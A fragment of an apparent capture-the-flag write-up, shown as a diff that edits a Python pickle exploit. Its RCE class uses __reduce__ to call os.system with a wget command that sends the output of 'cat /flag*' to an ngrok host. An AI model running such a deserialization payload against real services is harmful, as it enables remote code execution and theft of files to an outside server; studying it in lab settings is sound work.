@@ -323,7 +323,7 @@ So, i modified the exploit a bit to get the flag:
 ```python
 class RCE:
     def __reduce__(self):
-        cmd = ('wget "https://2c52-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app/something$(cat /flag*)"')
+        cmd = ('wget "https://2c52-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app/something$(cat /flag*)"',)
         return os.system, (cmd,)
 ```
 
